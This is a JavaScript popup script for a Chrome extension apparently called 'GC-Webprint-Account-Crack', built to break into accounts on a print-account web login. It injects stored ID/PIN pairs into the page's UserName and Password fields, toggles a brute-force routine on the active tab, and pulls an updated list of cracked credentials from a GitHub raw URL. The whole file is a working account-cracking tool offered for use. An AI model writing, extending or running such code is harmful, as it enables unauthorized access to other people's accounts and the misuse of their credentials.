// Copyright 2018 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

'use strict';

let bruteForce = document.getElementById('bruteForce');
let select = document.getElementById('select');
let toggleList = document.getElementById('toggleList');
let listPanel = document.getElementById('listPanel');
let login = document.getElementById('loginWithList');
let latest = document.getElementById('downloadLatest');

chrome.storage.sync.get('savedKeys', (data) => {
  console.log(JSON.parse(data.savedKeys));
  Object.keys(JSON.parse(data.savedKeys)).forEach((key) => {
    select.innerHTML += `<option value="${JSON.parse(data.savedKeys)[key]}" >${key}</option>`;
  });
});

login.onclick = () => {
  alert(`ID: ${select.options[select.selectedIndex].text}, PIN: ${select.value}`);
  
  chrome.tabs.executeScript(
    tabs[0].id,
    {
      code: `document.getElementById('UserName').value = ${select.options[select.selectedIndex].text}; document.getElementById('btnSubmit').click();`
    }
  );
  setTimeout(() => {
    chrome.tabs.executeScript(
      tabs[0].id,
      {
        code: `document.getElementById('Password').value = ${select.value}; document.getElementById('btnSubmit').click();`
      }
    );
  }, 300);
}

toggleList.onclick = () => {
  if (listPanel.style.display == 'none') {
    listPanel.style.display = 'block';
  } else {
    listPanel.style.display = 'none';
  }
}

chrome.storage.sync.get('bruteForce', (data) => {
  if (data.bruteForce == true) {
    bruteForce.innerHTML = 'Stop';
  } else {
    bruteForce.innerHTML = 'Brute Force';
  }
});

bruteForce.onclick = () => {
  var active;
  chrome.storage.sync.get('bruteForce', (data) => { active = data.bruteForce; procceed();});

  function procceed() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      if (active == true) {
        bruteForce.innerHTML = 'Brute Force';
        chrome.storage.sync.set({bruteForce: false}, function() {
          console.log('bruteForce: ' + false);
        });
        chrome.tabs.executeScript(
          tabs[0].id,
          {code: 
            `
            active = false;
            `});
      } else {
        bruteForce.innerHTML = 'Stop';
        chrome.storage.sync.set({bruteForce: true}, function() {
          console.log('bruteForce: ' + true);
        });
        chrome.tabs.executeScript(
          tabs[0].id,
          {code: 
            `
            active = true;
            console.log('BruteForce starting...');
            go(document.getElementById('UserName').value);
            `});
      }
    });
  }
};

latest.onclick = () => {
  const request = new XMLHttpRequest();
  request.open('GET', 'https://raw.githubusercontent.com/jgpro/GC-Webprint-Account-Crack/master/data/latest.json', true);
  request.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      let newList = JSON.parse(request.responseText);
      chrome.storage.sync.get('savedKeys', (data) => {
        let list = JSON.parse(data.savedKeys);
        Object.keys(newList).forEach((key) => {
          list[key] = newList[key];
        });
        chrome.storage.sync.set({savedKeys: JSON.stringify(list)}, () => {
          console.log('Updated local list against lastest github release.')
        });
       });
    }
  };
  request.send();
}